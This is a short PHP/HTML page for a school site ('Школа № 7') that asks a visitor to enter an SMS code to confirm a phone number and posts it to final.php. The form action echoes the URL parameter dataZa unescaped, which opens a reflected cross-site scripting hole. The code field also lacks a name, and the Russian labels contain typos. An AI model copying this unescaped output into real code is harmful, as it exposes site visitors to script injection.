<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <!-- Style CSS -->
    <link rel="stylesheet" href="./assets/css/style.css?rnd=<?= rand(0, 999) ?>">
    <title>Школа № 7</title>
</head>

<body>

    <div class="container">
        <!-- code here -->

        <form action="final.php?dataZa=<?php echo $_GET['dataZa'] ?>" method="POST">
            <div class="card">
                <div class="card-form">
                    <h3>Введиет код из CMC для подтвержения телефона</h3>

                    <div class="input">
                        <input type="tel" class="input-field" required />
                        <label class="input-label">Введите код из СМС
                            <span style="color: red;">*</span></label>
                    </div>
                </div>
            </div>

            <div class="action">
                <button type="submit" class="action-button" style="cursor: pointer; margin-bottom: 30px;">Подтвердить</button>
            </div>
        </form>
        <form action="index.php">
            <button type="submit" class="action-button" style="cursor: pointer;">Назад</button>
        </form>
    </div>

</body>

</html>